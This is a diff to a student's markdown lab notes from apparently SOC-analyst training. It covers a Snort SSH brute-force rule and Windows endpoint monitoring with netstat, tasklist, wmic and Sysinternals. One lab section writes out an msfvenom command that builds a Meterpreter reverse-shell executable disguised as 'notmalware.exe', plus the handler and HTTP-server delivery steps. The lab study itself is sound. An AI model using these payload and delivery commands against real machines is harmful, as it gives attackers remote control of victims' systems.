@@ -760,7 +760,9 @@ This time around we will use snorpy to generetat the rule set.
 ![Snorpy](image-64.png)
 
 The generated rule is
+
 ``` bash
+
 alert tcp any any -> any 22 ( msg:"Potential SSH Brute Force Attack Detected"; flow:to_server,established; threshold:type both, track by_src, count 5 , seconds 30; sid:1000007; rev:1; )
 
 ```
@@ -769,13 +771,156 @@ The rule generated the alert as expected in the image below
 ![ssh brute force attempt](image-65.png)
 
 
+### ENDPOINT PROTECTION.
+
+To start metasploitable we type msfconsole.
+We need to tell it where it need to connect back to.**192.168.114.10**
+**msfvenon** is the payload generation took
+
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.114.10 LPORT=4444 -f exe -o notmalware.exe`
+
+p specifies the type of payload and sicne we using windows wetyoe windoes
+![alt text](image-66.png)
+
+![alt text](image-67.png)
+
+Setting up meterpreter listener
+
+`sf6 > use exploit/multi/handler `
+`set PAYLOAD windows/meterpreter/reverse_tcp`
+
+![alt text](image-68.png)
+
+After all and done we need to set our Machine as a server to start listengin on and we will use a python in this case
+`python3 -m http.server 8000`
+
+
+### Accessing the FIles in WIndows
+Running **http://192.168.114.10:8000/** in the browser opens the directory listening
+
+
+![alt text](image-69.png)
+
+
+![alt text](image-70.png)
+
+After running the file a session was established in the metasploitable
+![alt text](image-71.png)
 ## SKILLS
+
+
+## ENDPOINT Monitoring
+
+On windows you can use the `net view \\<IP address>` to view the open shares. THis is important because an attacker can create shares
+![no shares deected](image-72.png)
+At this point no shares have been deteceted but we will use the Ubuntu machine to create a share since we are attacking the windows from the 
+Ubuntu machine.
+![alt text](image-73.png)
+
+I created a share called Exfil and then map it with the command `net share Exfil=C:\Users\tcm\Downloads\Exfil`
+![Net share](image-74.png)
+
+Having done this I can confirm the share is now available inn Windows the the command
+
+```bash
+net view\\127.0.0.1
+```
+![alt text](image-75.png)
+
+
+A full list of shares on the windows intance can then be viewed using the net share command again
+![net share in windows](image-76.png)
+
+The next command is net session which shows the inbound session on the system in order to know who is taling tout
+I crearted a Drive and map it to our share on Ubuntu with the command `net use X: \\127.0.0.1\Exfil`
+![alt text](image-77.png).
+
+This creares a session.
+![alt text](image-78.png)
+
+The net use command gives a much more holistic picture abnout the share usage inn the environemt. as displayed below
+![alt text](image-79.png)
+
+### netstat command
+
+![alt text](image-80.png)
+
+`netstat -anob`
+
+The process ID identified is **8028**
+
+For more graphical vierw i downlaoded the Tcpveiw utiltity
+![alt text](image-81.png)
+
+### Processes in Endpoint Security
+
+Each process has it owne set of system resources like CPU, RAM etc.
+1. Windows or System Processes
+   1. OS COre Function
+   2. System, smss.exe, csrss.exe
+2. User or applicaiton processes
+3. Service Bakg
+
+In order to view the running processes and thier parent child relationship, it is advisable to use the native tool
+in windows. The natice tools is **tasklist**. The /V will make the output more verbose or more detailed. The /M flag will 
+display the DLL modules for each process/ The /FI will help to narrow down the ouput.
+![tasks](image-82.png)
+
+
+Running `tasklist /FI "PID eq 8028"`  will pull out the proecess with an ID of 8028
+![PID of 8028](image-83.png)
+DLL is a file or a program that containes code that can be used by multiple programs at the same time.
+Now to check the DLL of the notmalware.exe file. We append the /M flag to the earlier command
+![DLL ](image-84.png)
+
+### WMIC (Windows Management Instrumentation Command Line)
+
+The wmic command can be used to gather more details on a process. Running it on the process iD can also give you the parent process
+`wmic process where processid=8028 get name, parentprocessid,processid`
+
+![alt text](image-85.png)
+
+The parnet PRocess ID identofied is **6988**
+`wmic process get name, parentprocessid,processid | find "6988"`
+![alt text](image-86.png)
+
+To obtqin the command line option of a program using the wmic, we use th command.
+`wmic process where processid=8028 get commandline`
+![alt text](image-87.png)
+
+
+### Windows COre Processes
+Using sysinternal tools.
+Process Monitor: Shows process as they are ocuring
+Process Explore is ......
+
+![alt text](image-88.png)
+Pink coour indicate it is hosting some proceses
+
+1. Sytem Process: it alwasy have an ID of 4
+   1. kernel-mode system thread
+   2. a CPU, memory, Disk
+   3. Device drivers, hardware, process shcedullun etc. It does generally not have parent process
+
+![alt text](image-89.png)
+2. Session manager Subsystem (smss.exe)
+   1. Windows session manager
+   2. Initiating and and managing user sessions
+   3. The first master of the service launches child sessions
+   ![alt text](image-90.png)
+3. Client Server Subsystem(csrss.exe)
+   ![alt text](image-91.png)
+
+
+## Learnt Things
 
 1. Email Analysis.
 2. Phishing Analysis
 3. URL Analysis
 4. Intrusion detection and Prevention with Snort
 5. Packet Analysis
-6. Detection Rules
-7. Network Monitoring
-8. Snort
+6.  Detection Rules
+7.  Network Monitoring
+8.  Snort
+9.  Endpint monitoring
+10. Sysinternals
